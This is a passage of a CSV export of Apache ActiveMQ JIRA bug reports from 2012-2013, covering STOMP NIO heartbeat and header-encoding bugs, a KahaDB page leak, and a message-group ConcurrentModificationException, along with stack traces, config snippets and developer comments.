","Kernel:Linux tjjackson 3.0.0-26-generic #43-Ubuntu SMP Tue Sep 25 17:19:22 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux

AMQ: 5.7.0
Ubuntu: 11.10
Java: 1.6.0_24

From activemq.xml:

<transportConnector name=""stomp"" 
  uri=""stomp+nio://0.0.0.0:61613?trace=true""/>

",gmallard,lionel.cons,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Oct/12 14:24;gmallard;nioheartb.rb;https://issues.apache.org/jira/secure/attachment/12549068/nioheartb.rb",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,248564,,,Tue Oct 23 19:14:24 UTC 2012,,,,,,,,,,,"0|i09w2n:",55637,,,,,,,,,,,,,,,,,,,,,"14/Oct/12 14:24;gmallard;Ruby client example.
;;;","22/Oct/12 21:44;tabish;Was able to reproduce some issue in a JUnit, will take a look.;;;","23/Oct/12 15:32;tabish;There's a couple issues in the NIO layer mainly relating to not keeping the TcpTransports receiverCounter moving which causes the InactivityMonitor to think that no reads are occurring when we are only getting STOMP keep alives which are just newlines.  The StompCodec also has a bug that's causing it to get stuck because of this. ;;;","23/Oct/12 19:14;tabish;Fixed now, also should fix a similar issue with AMQP and MQTT NIO transports. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
STOMP 1.1 CONNECTED Frame has erroneously encoded headers,AMQ-4104,12611702,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,gmallard,gmallard,13/Oct/12 15:14,16/Oct/12 15:00,14/Jul/23 05:43,16/Oct/12 15:00,5.7.0,,,,,5.8.0,,,STOMP,,,,0,,,,,,,,,"The STOMP 1.1 specification says:

All frames except the CONNECT and CONNECTED frames will also escape any colon or newline octets found in the resulting UTF-8 encoded headers. ...... The CONNECT and CONNECTED frames do not escape the colon or newline octets in order to remain backward compatible with STOMP 1.0.

AMQ 5.7.0 is out of specification with regard to this.

Example telnet session:

$ telnet tjjackson 61613
Trying 192.168.1.200...
Connected to tjjackson.
Escape character is '^]'.
CONNECT
login:me
passcode:asdasd
accept-version:1.1
host:tjjackson
heart-beat:10000,15000

^@
CONNECTED
heart-beat:15000,10000
session:ID\ctjjackson-55318-1350137693500-2\c1
server:ActiveMQ/5.7.0
version:1.1
","Ubuntu 11.10
",gmallard,lionel.cons,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,248460,,,Tue Oct 16 15:00:19 UTC 2012,,,,,,,,,,,"0|i09va7:",55509,,,,,,,,,,,,,,,,,,,,,"15/Oct/12 15:32;tabish;I tested this against the 5.7 release and this is not happening, the code doesn't encode headers until after the CONNECTED frame is sent and the protocol version is set.  Reopen if you can provide a JUnit test case that reproduces this.;;;","15/Oct/12 22:18;gmallard;Apologies, but my report of this was inaccurate and incomplete.

It only happens with: stomp+nio

;;;","16/Oct/12 14:26;tabish;Looks like the fix for AMQ-3823 is setting the Stomp version to eagerly in the NIO case which is the problem.  ;;;","16/Oct/12 15:00;tabish;Fixed in trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
LeaseDatabaseLocker can not be changed from 5 sec poll,AMQ-4103,12611624,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,gtully,jimkerwood,jimkerwood,12/Oct/12 19:59,09/Nov/12 20:38,14/Jul/23 05:43,15/Oct/12 10:41,5.7.0,,,,,5.8.0,,,,,,,0,,,,,,,,,LeaseDatabaseLocker the default config runs after the setter thus always setting a 5 sec check no matter the config.,,gtully,ibeaumont,jimkerwood,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4005,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,248109,,,Fri Nov 09 20:38:32 UTC 2012,,,,,,,,,,,"0|i09lif:",53918,,,,,,,,,,,,,,,,,,,,,"15/Oct/12 10:40;gtully;linking back to refactor that triggered this issue.;;;","15/Oct/12 10:41;gtully;fix and test in http://svn.apache.org/viewvc?rev=1398238&view=rev

default sleep period now 10s (to bring into line with other lockers, ie: shared default);;;","15/Oct/12 15:48;jimkerwood;The Database one might have the same defect though I didn't test;;;","09/Nov/12 20:38;gtully;fixed same issue in DefaultDataBase locker - http://svn.apache.org/viewvc?rev=1407621&view=rev
thanks @Jim Kerwood for spotting this.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WebSocket connections not cleaned,AMQ-4100,12610965,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,09/Oct/12 11:38,09/Oct/12 11:43,14/Jul/23 05:43,09/Oct/12 11:43,5.7.0,,,,,5.8.0,,,,,,,0,,,,,,,,,"When there's transport timeout or broker is shut, the MBean is not properly cleaned.",,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,245993,,,Tue Oct 09 11:43:24 UTC 2012,,,,,,,,,,,"0|i07frr:",41321,,,,,,,,,,,,,,,,,,,,,"09/Oct/12 11:43;dejanb;Fixed with svn revision 1395976;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
[osgi] activemq-blueprint feature failed to install on Karaf 2.3.0,AMQ-4099,12610964,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,amarkevich,amarkevich,09/Oct/12 11:25,16/Oct/12 04:59,14/Jul/23 05:43,16/Oct/12 04:59,5.7.0,,,,,5.8.0,,,,,,,0,,,,,,,,,"> features:install activemq-blueprint 
Error executing command: Could not start bundle mvn:org.apache.xbean/xbean-blueprint/3.11.1 in feature(s) activemq-blueprint-5.7.0: The bundle ""org.apache.xbean.blueprint_3.11.1 [243]"" could not be re
solved. Reason: Missing Constraint: Import-Package: org.apache.aries.blueprint; version=""[0.3.0,1.0.0)""

> list -t 10 -s | grep aries
[   7] [Active     ] [Created     ] [       ] [   20] org.apache.aries.blueprint.core (1.0.1)
[   8] [Active     ] [            ] [       ] [   20] org.apache.aries.util (1.0.0)
[   9] [Active     ] [            ] [       ] [   20] org.apache.aries.proxy.api (1.0.0)
[  11] [Active     ] [            ] [       ] [   20] org.apache.aries.blueprint.api (1.0.0)
[  12] [Active     ] [            ] [       ] [   20] org.apache.aries.proxy.impl (1.0.0)
[  13] [Active     ] [Created     ] [       ] [   20] org.apache.aries.blueprint.cm (1.0.0)
[  23] [Active     ] [            ] [       ] [   30] org.apache.aries.jmx.blueprint.core (1.0.0)
[  32] [Active     ] [            ] [       ] [   30] org.apache.aries.jmx.core (1.0.1)
[  37] [Active     ] [            ] [       ] [   30] org.apache.aries.jmx.api (1.0.0)
[  40] [Active     ] [            ] [       ] [   30] org.apache.aries.jmx.blueprint.api (1.0.0)",Karaf 2.3.0,amarkevich,davsclaus,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,245990,,,Tue Oct 16 04:59:40 UTC 2012,,,,,,,,,,,"0|i07fqn:",41316,,,,,,,,,,,,,,,,,,,,,"09/Oct/12 11:32;davsclaus;This is an XBean issue if it has OSGi manifest which is limited to blueprint < 1.0. You should report this at the Apache XBean JIRA tracker.;;;","09/Oct/12 11:37;davsclaus;There is a new XBean 3.12 being released in the near future. It supports Aries 1.0.;;;","09/Oct/12 11:45;davsclaus;When xbean 3.12 is out we should upgrade.;;;","16/Oct/12 04:59;davsclaus;I can install 5.8-SNAPSHOT in the just released Karaf 2.3.0.

There is an new XBean 3.12 out.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ 5.7 - Misses some binary files in the release kit,AMQ-4098,12610936,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,davsclaus,davsclaus,09/Oct/12 06:33,10/Oct/12 15:32,14/Jul/23 05:43,10/Oct/12 15:32,5.7.0,,,,,5.8.0,,,,,,,1,,,,,,,,,"See nabble
http://activemq.2283324.n4.nabble.com/ActiveMQ-5-7-0-startup-error-broker-ks-missing-tp4657622.html;cid=1349764415189-189

",,davsclaus,sslavic,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,245751,,,Wed Oct 10 15:32:18 UTC 2012,,,,,,,,,,,"0|i06dmv:",35143,,,,,,,,,,,,,,,,,,,,,"09/Oct/12 09:14;davsclaus;This applies for both the unix and windows zip / tarball.

The broker and client keystores etc is needed for the activemq-demo.xml.;;;","10/Oct/12 15:28;tabish;Also missing wrapper.jar;;;","10/Oct/12 15:32;tabish;fixed the assembly descriptor;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Problem with STOMP NIO + SSL,AMQ-4095,12610807,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,mpaladin,mpaladin,08/Oct/12 09:36,10/Oct/12 22:56,14/Jul/23 05:43,10/Oct/12 22:56,5.8.0,,,,,5.8.0,,,Broker,,,,0,,,,,,,,,"Problem found with STOMP+NIO+SSL:
- broker with STOMP+NIO+SSL
- start a queue consumer
- send a large (>= 16kB) message
- the consumer will hang, not receiving the full message

http://activemq.2283324.n4.nabble.com/DISCUSS-ActiveMQ-5-7-release-td4656244.html#a4657240",,johno,lionel.cons,mpaladin,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Oct/12 09:37;mpaladin;testSendReceiveBigMessage.diff;https://issues.apache.org/jira/secure/attachment/12548218/testSendReceiveBigMessage.diff",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,245521,,,Wed Oct 10 22:56:11 UTC 2012,,,,,,,,,,,"0|i06bef:",34780,,,,,,,,,,,,,,,,,,,,,"08/Oct/12 09:37;mpaladin;unit test which reproduce the problem;;;","08/Oct/12 15:51;mpaladin;I forgot to say that the test added makes StompNIOSSLTest to fail.;;;","10/Oct/12 22:56;tabish;Fixed on trunk, should appear in the next nightly. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
offline durable subs with selectors can lead to page leaks in the index and bloat of db.data in kahadb,AMQ-4094,12610580,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,05/Oct/12 15:04,05/Oct/12 19:07,14/Jul/23 05:43,05/Oct/12 19:07,5.6.0,5.7.0,,,,5.8.0,,,,,,,0,db.data,durable,kahadb,topic,,,,,"There is a page leak in the index, related to durable subs with selectors. producing and consuming past variable limits demonstrate incremental growth in the db.data, the in-use page count increases",,gtully,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,243541,,,Fri Oct 05 19:07:20 UTC 2012,,,,,,,,,,,"0|i03p5z:",19510,,,,,,,,,,,,,,,,,,,,,"05/Oct/12 19:02;gtully;a workaround is to avoid page overflow by configuring a large index page size for kahadb. The size needs to be > any single stored value. In the case of offline durables with selectors the sequence set of pending messages needs to fit in one page.;;;","05/Oct/12 19:07;gtully;fix in http://svn.apache.org/viewvc?rev=1394733&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ConcurrentModificationException when using message groups,AMQ-4092,12610178,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,boday,boday,04/Oct/12 02:56,17/Sep/13 10:19,14/Jul/23 05:43,17/Sep/13 10:06,5.6.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"seeing these WARN messages frequently while consuming (maxConcurrentConsumers=5) from a queue with the message groups header (JMSXGroupID) set.  If I disable the message groups header, these errors go away...  

That said, I don't see any specific errors with my application (at this point), just these messages in my logs.

2012-10-04 02:34:02,552 |  WARN - Service              - | Async error occurred: java.util.concurrent.ExecutionException: java.util.ConcurrentModificationException
java.util.concurrent.ExecutionException: java.util.ConcurrentModificationException
	at java.util.concurrent.FutureTask$Sync.innerGet(FutureTask.java:222)
	at java.util.concurrent.FutureTask.get(FutureTask.java:83)
	at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:785)
	at org.apache.activemq.broker.region.Queue.send(Queue.java:707)
	at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:407)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:503)
	at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:305)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:306)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)
	at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:453)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:150)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:231)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)
Caused by: java.util.ConcurrentModificationException
	at java.util.HashMap$HashIterator.nextEntry(HashMap.java:793)
	at java.util.HashMap$KeyIterator.next(HashMap.java:828)
	at org.apache.activemq.util.MarshallingSupport.marshalPrimitiveMap(MarshallingSupport.java:64)
	at org.apache.activemq.command.Message.beforeMarshall(Message.java:210)
	at org.apache.activemq.command.ActiveMQObjectMessage.beforeMarshall(ActiveMQObjectMessage.java:199)
	at org.apache.activemq.openwire.v6.MessageMarshaller.looseMarshal(MessageMarshaller.java:277)
	at org.apache.activemq.openwire.v6.ActiveMQMessageMarshaller.looseMarshal(ActiveMQMessageMarshaller.java:111)
	at org.apache.activemq.openwire.v6.ActiveMQObjectMessageMarshaller.looseMarshal(ActiveMQObjectMessageMarshaller.java:111)
	at org.apache.activemq.openwire.OpenWireFormat.marshal(OpenWireFormat.java:168)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.addMessage(KahaDBStore.java:429)
	at org.apache.activemq.store.kahadb.KahaDBStore$StoreQueueTask.run(KahaDBStore.java:1177)
	... 3 more
","ActiveMQ 5.6.0 standalone, kahadb persistence, Spring JMSTemplate producer (ObjectMessage), Camel 2.9.2 route consumer (AMQ connection pool, vm transport)",boday,can_do,donnchadh,gtully,the_amol,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,240208,,,Tue Sep 17 10:19:52 UTC 2013,,,,,,,,,,,"0|i00yhb:",3518,,,,,,,,,,,,,,,,,,,,,"04/Oct/12 10:23;gtully;message groups, makes sense, the problem is in
org.apache.activemq.broker.region.Queue#assignGroup where the JMSXGroupFirstForConsumer property is set, but the message is being stored concurrently.
A workaround is to disable kahadb concurrentStoreAndDispatchQueues, set to false. This will ensure that the dispatch (which can set the property) and store do not occur in parallel.

Need to check up on the need to set that property and see if we can do it after the message  is persisted such that it will work with concurrent store and dispatch.;;;","04/Oct/12 15:29;boday;thanks Gary, testing with concurrentStoreAndDispatchQueues=false now...so far so good;;;","04/Oct/12 16:24;boday;alright, concurrentStoreAndDispatchQueues=false appears to have resolved the issue...not sure if we should close this given the work around of if there is a code change to better handle this case w/o that setting...I'll leave it open for now...thanks again;;;","29/Nov/12 21:49;boday;After doing some burnin/performance testing with concurrentStoreAndDispatchQueues=""false""...this setting if proving problematic and is causing unacceptable throttling of our application.  Is this issue addressed in a 5.7.0?  if not, any plan to address it?  thanks...;;;","06/Feb/13 18:15;gtully;line this up for the next release;;;","12/Apr/13 08:21;can_do;I have the same error in AMQ 5.7.0.
The detail log is as the following:
////////////////begin////////////
javax.jms.JMSException: java.util.ConcurrentModificationException
        at com.rf.emq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)
        at com.rf.emq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1377)
        at com.rf.emq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1305)
        at com.rf.emq.ActiveMQSession.send(ActiveMQSession.java:2060)
        at com.rf.emq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:277)
        at com.rf.emq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:212)
        at com.rf.emq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:241)
        at com.rf.emq.product.message.ByteMessageSender.produceMessageInFragmentWithReturnValue(ByteMessageSender.java:166)
        at com.rf.emq.product.web.AutoSplitLargeFileAndSendTimerTask.splitLargeFile(AutoSplitLargeFileAndSendTimerTask.java:693)
        at com.rf.emq.product.web.AutoSplitLargeFileAndSendTimerTask$SplitLargFileSubTask.run(AutoSplitLargeFileAndSendTimerTask.j
ava:879)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
        at java.lang.Thread.run(Thread.java:722)
Caused by: java.util.concurrent.ExecutionException: java.util.ConcurrentModificationException
        at java.util.concurrent.FutureTask$Sync.innerGet(FutureTask.java:252)
        at java.util.concurrent.FutureTask.get(FutureTask.java:111)
        at com.rf.emq.broker.region.Queue.doMessageSend(Queue.java:795)
        at com.rf.emq.broker.region.Queue.send(Queue.java:717)
        at com.rf.emq.broker.region.AbstractRegion.send(AbstractRegion.java:407)
        at com.rf.emq.broker.region.RegionBroker.send(RegionBroker.java:503)
        at com.rf.emq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:311)
        at com.rf.emq.broker.BrokerFilter.send(BrokerFilter.java:129)
        at com.rf.emq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
        at com.rf.emq.broker.TransactionBroker.send(TransactionBroker.java:317)
        at com.rf.emq.broker.BrokerFilter.send(BrokerFilter.java:129)
        at com.rf.emq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)
        at com.rf.emq.broker.TransportConnection.processMessage(TransportConnection.java:450)
        at com.rf.emq.command.ActiveMQMessage.visit(ActiveMQMessage.java:680)
        at com.rf.emq.broker.TransportConnection.service(TransportConnection.java:294)
        at com.rf.emq.broker.TransportConnection$1.onCommand(TransportConnection.java:152)
        at com.rf.emq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
        at com.rf.emq.transport.MutexTransport.onCommand(MutexTransport.java:50)
        at com.rf.emq.transport.vm.VMTransport.iterate(VMTransport.java:241)
        at com.rf.emq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129)
        at com.rf.emq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47)
        ... 3 more
Caused by: java.util.ConcurrentModificationException
        at java.util.HashMap$HashIterator.nextEntry(HashMap.java:806)
        at java.util.HashMap$KeyIterator.next(HashMap.java:841)
        at com.rf.emq.util.MarshallingSupport.marshalPrimitiveMap(MarshallingSupport.java:64)
        at com.rf.emq.command.Message.beforeMarshall(Message.java:215)
        at com.rf.emq.openwire.v6.MessageMarshaller.looseMarshal(MessageMarshaller.java:277)
        at com.rf.emq.openwire.v6.ActiveMQMessageMarshaller.looseMarshal(ActiveMQMessageMarshaller.java:111)
        at com.rf.emq.openwire.v6.ActiveMQBytesMessageMarshaller.looseMarshal(ActiveMQBytesMessageMarshaller.java:111)
        at com.rf.emq.openwire.OpenWireFormat.marshal(OpenWireFormat.java:168)
        at com.rf.emq.store.kahadb.KahaDBStore$KahaDBMessageStore.addMessage(KahaDBStore.java:431)
        at com.rf.emq.store.kahadb.KahaDBStore$StoreQueueTask.run(KahaDBStore.java:1192)
        ... 3 more
////////////////end///////////////;;;","12/Apr/13 08:26;can_do;I have set the message property such as msg.setGroupID(""GROUPBEGIN_"" + encodedName + ""_GROUPEND_""
				+ file.length()) and msg.setGroupSequence(++i);
From message property,I see the value of JMSXGroupFirstForConsumer is true.

Whether this extensive property JMSXGroupFirstForConsumer can be set to false and problem can be eliminated or not.;;;","17/May/13 16:59;boday;when this ConcurrentModificationException event occurs...does an exception get thrown back to the producer or consumer of this message or is the issue just with setting the JMSXGroupFirstForConsumer property?;;;","02/Aug/13 05:16;the_amol;Hi,

i am not an expert using Activemq..but i am facing the same issue. Gary Tully can you please suggest where to add, i.e. under which section, the fix code i.e. ""concurrentStoreAndDispatchQueues=false"" in activemq.xml? or please provide sample activemq.xml file with this workaround.

Thanks,
amol;;;","02/Aug/13 10:08;gtully;@Amol google is always your friend. It is an option on kahadb - http://activemq.apache.org/kahadb.html

so {code}<broker brokerName=""broker"" ... >
   <persistenceAdapter>
     <kahaDB ... concurrentStoreAndDispatchQueues =""false""/>
   </persistenceAdapter>
   ...
 </broker>{code};;;","02/Aug/13 10:47;the_amol;Gary, thanks for replying. I used the settings..but still i am getting the
same exception and failure for same file but at random occasions i.e. the
same file is working fine most of time and some time it is failing. I am
using latest release of activemq i.e.5.8.0

Please suggest.

;;;","16/Sep/13 20:29;gtully;@Amol - are you using composite destinations in your producers?;;;","17/Sep/13 10:06;gtully;fix in http://git-wip-us.apache.org/repos/asf/activemq/commit/dd91e859

JMSXGroupFirstForConsumer property is now backed by a message attribute which avoids contention. requires v10 wireformat;;;","17/Sep/13 10:19;the_amol;thanks Gary..i will give it a try.






-- 
Thanks & Regards
Amol Verma
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Missing svn:ignores,AMQ-4090,12609962,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,jgomes,jgomes,02/Oct/12 18:56,02/Oct/12 19:28,14/Jul/23 05:43,02/Oct/12 19:28,5.7.0,,,,,5.7.0,5.8.0,,Broker,,,,0,,,,,,,,,"There are missing *svn:ignore* attributes for some new files and folders that are created during the build.  Following are the list of files and folders that should be ignored.  This affects the new 5.7.0 Release Candidate as well.  Having these left around continually triggers automated build servers to rebuild the project when it doesn't need to.

{noformat}
activemq-leveldb\target
activemq-run\dependency-reduced-pom.xml
activemq-all\dependency-reduced-pom.xml
tests\target
{noformat}
",,jgomes,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249720,,,Tue Oct 02 19:28:22 UTC 2012,,,,,,,,,,,"0|i0ah33:",59041,Regression,,,,,,,,,,,,,,,,,,,,"02/Oct/12 19:28;tabish;updated trunk with the missing ignores. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The perfharness-activemq.sh script has 5.0-SNAPSHOT as version number,AMQ-4088,12609876,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,davsclaus,davsclaus,davsclaus,02/Oct/12 07:04,02/Oct/12 09:55,14/Jul/23 05:43,02/Oct/12 09:55,5.7.0,,,,,5.8.0,,,,,,,0,,,,,,,,,"This script is part of the release. We should remove the version number.

# It assumes that the apache-activemq-5.0-SNAPSHOT.jar and 
